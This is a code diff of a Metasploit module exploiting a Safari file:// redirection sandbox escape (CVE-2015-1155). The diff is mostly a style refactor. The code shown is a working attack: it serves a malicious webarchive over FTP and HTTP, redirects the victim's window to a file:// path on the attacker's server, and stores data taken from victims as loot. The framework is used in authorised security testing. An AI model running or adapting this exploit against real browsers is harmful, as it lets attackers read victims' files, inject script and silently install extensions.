@@ -3,50 +3,47 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::FtpServer
   include Msf::Exploit::Format::Webarchive
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Mac OS X Safari file:// Redirection Sandbox Escape',
-      'Description' => %q{
-        Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a
-        "state management issue" that allows a browser window to be navigated
-        to a file:// URL. By dropping and loading a malicious .webarchive file,
-        an attacker can read arbitrary files, inject cross-domain Javascript, and
-        silently install Safari extensions.
-      },
-      'License'     => MSF_LICENSE,
-      'Author'      => [
-        'joev' # discovery, module
-      ],
-      'References'  => [
-        ['ZDI', '15-228'],
-        ['CVE', '2015-1155'],
-        ['URL', 'https://support.apple.com/en-us/HT204826']
-      ],
-      'Platform'    => 'osx',
-      'DisclosureDate' => '2014-01-16'
-    ))
-
+    super(
+      update_info(
+        info,
+        'Name' => 'Mac OS X Safari file:// Redirection Sandbox Escape',
+        'Description' => %q{
+          Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a
+          "state management issue" that allows a browser window to be navigated
+          to a file:// URL. By dropping and loading a malicious .webarchive file,
+          an attacker can read arbitrary files, inject cross-domain Javascript, and
+          silently install Safari extensions.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'joev' # discovery, module
+        ],
+        'References' => [
+          ['ZDI', '15-228'],
+          ['CVE', '2015-1155'],
+          ['URL', 'https://support.apple.com/en-us/HT204826']
+        ],
+        'Platform' => 'osx',
+        'DisclosureDate' => '2014-01-16',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
-      OptPort.new('SRVPORT',   [true, "The local port to use for the FTP server", 8081]),
-      OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080])
+      OptPort.new('SRVPORT', [true, "The local port to use for the FTP server", 8081]),
+      OptPort.new('HTTPPORT', [true, "The HTTP server port", 8080])
     ])
-  end
-
-  def lookup_lhost(c=nil)
-    # Get the source address
-    if datastore['SRVHOST'] == '0.0.0.0'
-      Rex::Socket.source_address( c || '50.50.50.50')
-    else
-      datastore['SRVHOST']
-    end
   end
 
   def on_request_uri(cli, req)
@@ -91,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def ftp_url
-    "ftp://#{ftp_user}:#{ftp_pass}@#{lookup_lhost}:#{datastore['SRVPORT']}"
+    "ftp://#{ftp_user}:#{ftp_pass}@#{srvhost_addr}:#{datastore['SRVPORT']}"
   end
 
   def popup_html
@@ -118,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
         function() {
           history.pushState.call(
             opener.history, {}, {},
-            'file:///Volumes/#{lookup_lhost}/#{payload_name}'
+            'file:///Volumes/#{srvhost_addr}/#{payload_name}'
           );
         },
         function() { opener.location = 'about:blank'; },
@@ -145,7 +142,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending directory list via data connection #{webarchive_size}")
     month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
-    m = month_names[Time.now.month-1]
+    m = month_names[Time.now.month - 1]
     d = Time.now.day
     y = Time.now.year
 
@@ -212,22 +209,17 @@ class MetasploitModule < Msf::Auxiliary
   # Handle the HTTP request and return a response.  Code borrorwed from:
   # msf/core/exploit/http/server.rb
   #
-  def start_http(opts={})
-    # Ensture all dependencies are present before initializing HTTP
+  def start_http(opts = {})
+    # Ensure all dependencies are present before initializing HTTP
     use_zlib
 
-    comm = datastore['ListenerComm']
-    if (comm.to_s == "local")
-      comm = ::Rex::Socket::Comm::Local
-    else
-      comm = nil
-    end
+    comm = _determine_server_comm(bindhost)
 
     # Default the server host / port
     opts = {
-      'ServerHost' => datastore['SRVHOST'],
+      'ServerHost' => bindhost,
       'ServerPort' => datastore['HTTPPORT'],
-      'Comm'       => comm
+      'Comm' => comm
     }.update(opts)
 
     # Start a new HTTP server
@@ -237,7 +229,7 @@ class MetasploitModule < Msf::Auxiliary
       opts['ServerHost'],
       datastore['SSL'],
       {
-        'Msf'        => framework,
+        'Msf' => framework,
         'MsfExploit' => self,
       },
       opts['Comm'],
@@ -250,8 +242,8 @@ class MetasploitModule < Msf::Auxiliary
     # provided.
     uopts = {
       'Proc' => Proc.new { |cli, req|
-          on_request_uri(cli, req)
-        },
+        on_request_uri(cli, req)
+      },
       'Path' => resource_uri
     }.update(opts['Uri'] || {})
 
@@ -287,7 +279,7 @@ class MetasploitModule < Msf::Auxiliary
   # Returns the configured (or random, if not configured) URI path
   #
   def resource_uri
-    path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))
+    path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8 + rand(8))
     path = '/' + path if path !~ /^\//
     datastore['URIPATH'] = path
     return path
@@ -296,7 +288,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Create an HTTP response and then send it
   #
-  def send_response(cli, code, message='OK', html='')
+  def send_response(cli, code, message = 'OK', html = '')
     proto = Rex::Proto::Http::DefaultProtocol
     res = Rex::Proto::Http::Response.new(code, message, proto)
     res['Content-Type'] = 'text/html'
@@ -309,7 +301,7 @@ class MetasploitModule < Msf::Auxiliary
   # @return [String] filename where we are storing the data
   def record_data(data, cli)
     name = if data.is_a?(Hash) then data.keys.first else 'data' end
-    file = File.basename(name).gsub(/[^A-Za-z]/,'')
+    file = File.basename(name).gsub(/[^A-Za-z]/, '')
     store_loot(
       file, "text/plain", cli.peerhost, data, "safari_webarchive", "Webarchive Collected Data"
     )
